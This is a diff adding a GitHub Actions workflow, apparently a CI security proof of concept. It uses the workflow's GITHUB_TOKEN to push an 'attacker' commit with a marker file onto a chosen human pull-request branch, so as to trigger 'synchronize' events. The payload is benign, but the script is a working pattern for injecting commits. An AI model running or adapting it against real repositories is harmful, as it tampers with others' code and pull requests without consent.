@@ -1,0 +1,67 @@
+name: human_sync_driver
+on:
+  workflow_dispatch:
+    inputs:
+      branch:
+        description: human PR head branch to push attacker commit to
+        required: true
+permissions:
+  contents: write
+  actions: write
+  pull-requests: write
+jobs:
+  attacker_push:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Identify caller
+        run: |
+          echo "DRIVER_RUN run=${{ github.run_id }} actor=${{ github.actor }} event=${{ github.event_name }}"
+      - name: Push ATTACKER_MARKER to human PR branch using captured GITHUB_TOKEN
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          TARGET_BRANCH: ${{ github.event.inputs.branch }}
+          REPO: ${{ github.repository }}
+        run: |
+          set -eu
+          # Fetch latest sha of target branch
+          base_sha=$(curl -s -H "Authorization: Bearer $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/${REPO}/git/ref/heads/${TARGET_BRANCH}" | jq -r .object.sha)
+          echo "BASE_SHA_OF_HUMAN_BRANCH=${base_sha}"
+          # Create a blob with ATTACKER_MARKER content
+          content_b64=$(printf 'attacker push via in-workflow GITHUB_TOKEN run=%s actor=%s\n' "${{ github.run_id }}" "${{ github.actor }}" | base64 -w0)
+          blob_sha=$(curl -s -X POST -H "Authorization: Bearer $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/${REPO}/git/blobs" \
+            -d "{\"content\":\"${content_b64}\",\"encoding\":\"base64\"}" | jq -r .sha)
+          echo "BLOB_SHA=${blob_sha}"
+          # Get base commit's tree
+          base_tree=$(curl -s -H "Authorization: Bearer $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/${REPO}/git/commits/${base_sha}" | jq -r .tree.sha)
+          # Create new tree with ATTACKER_MARKER.txt
+          tree_payload=$(jq -nc --arg base "$base_tree" --arg blob "$blob_sha" \
+            '{base_tree:$base, tree:[{path:"ATTACKER_MARKER.txt", mode:"100644", type:"blob", sha:$blob}]}')
+          new_tree=$(curl -s -X POST -H "Authorization: Bearer $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/${REPO}/git/trees" \
+            -d "${tree_payload}" | jq -r .sha)
+          echo "NEW_TREE_SHA=${new_tree}"
+          # Create commit
+          commit_payload=$(jq -nc --arg t "$new_tree" --arg p "$base_sha" \
+            '{message:"attacker: ATTACKER_MARKER via GITHUB_TOKEN", tree:$t, parents:[$p]}')
+          new_commit=$(curl -s -X POST -H "Authorization: Bearer $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/${REPO}/git/commits" \
+            -d "${commit_payload}" | jq -r .sha)
+          echo "ATTACKER_COMMIT_SHA=${new_commit}"
+          # Update branch ref -> this is the push that triggers `synchronize`
+          status=$(curl -s -o /tmp/ref.json -w "%{http_code}" -X PATCH \
+            -H "Authorization: Bearer $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/${REPO}/git/refs/heads/${TARGET_BRANCH}" \
+            -d "{\"sha\":\"${new_commit}\",\"force\":false}")
+          echo "REF_UPDATE_HTTP=${status}"
+          head -c 400 /tmp/ref.json || true
+          echo
+          echo "PUSHED_ATTACKER_SHA=${new_commit}"
